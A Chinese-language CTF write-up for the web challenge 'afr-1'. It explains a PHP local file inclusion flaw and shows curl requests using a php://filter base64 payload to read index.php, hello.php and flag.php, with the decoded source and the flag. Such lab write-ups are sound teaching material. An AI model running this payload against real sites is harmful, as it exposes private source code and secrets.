---
title: "afr-1"
date: 2026-07-02
categories:
  - CTF
  - WEB
tags:
  - CTF
  - LFI
  - 文件包含
  - php伪协议
---

# 1. 题目分析

访问靶机，URL 为 `/?p=hello`，页面输出 `hello world!`。参数 `p` 的值被直接输出，猜测后端可能存在文件包含（`include`）。

# 2. 源码获取

尝试用 `php://filter` 伪协议读取 `index.php` 源码：

```bash
curl -s "https://87b9f0159951799e8192d55c.http-ctf2.dasctf.com/?p=php://filter/convert.base64-encode/resource=index"
```

获取到 base64 内容：

```
PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=
```

解码后得到 `index.php` 源码：

```php
<?php

if(isset($_GET['p'])) {
    include (string)$_GET['p'] . ".php";
}
else{
    header('Location: /?p=hello');
}
```

# 3. 漏洞原理

核心漏洞在 `include (string)$_GET['p'] . ".php";` 这一行：

- **未过滤用户输入**：直接将 GET 参数 `p` 拼接到 `include()` 中
- **自动追加 `.php` 后缀**：参数 `hello` 变成包含 `hello.php`
- **`include()` 支持 PHP 伪协议**：可以利用 `php://filter` 包装器绕过限制，读取任意文件

| 请求 | 实际包含的文件 | 结果 |
|------|--------------|------|
| `?p=hello` | `hello.php` | `hello world!` |
| `?p=index` | `index.php` | 递归包含，无法正常显示 |
| `?p=php://filter/resource=index` | `index.php`（读取后 base64 输出） | ✅ 获取源码 |

# 4. 漏洞利用

由于 PHP 的 `include()` 支持流包装器（stream wrapper），我们可以使用 `php://filter` 将文件内容以 base64 编码后输出，从而绕过 PHP 代码被执行，直接读取文件源码。

## 4.1 读取 hello.php

```bash
curl -s "https://87b9f0159951799e8192d55c.http-ctf2.dasctf.com/?p=php://filter/convert.base64-encode/resource=hello"
```

返回 base64：`PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7`

解码：

```php
<?php

echo "hello world!";
```

## 4.2 读取 flag.php

```bash
curl -s "https://87b9f0159951799e8192d55c.http-ctf2.dasctf.com/?p=php://filter/convert.base64-encode/resource=flag"
```

返回 base64：`PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9`

解码：

```php
<?php
die('no no no');
//n1book{afr_1_solved}
```

# 5. Flag

```
n1book{afr_1_solved}
```

# 6. 总结

本题考察了 **PHP 本地文件包含（LFI）** 漏洞的两个要点：

1. **`.php` 后缀绕过**：`include($_GET['p'] . '.php')` 会自动追加后缀，但 `php://filter` 伪协议以 `resource=xxx` 结尾，追加 `.php` 后恰好构成合法文件名 `xxx.php`
2. **PHP 伪协议利用**：`php://filter/convert.base64-encode/resource=` 可以将文件内容以 base64 编码输出，避免 PHP 代码在包含时被执行，同时绕过 `die()` 等拦截逻辑
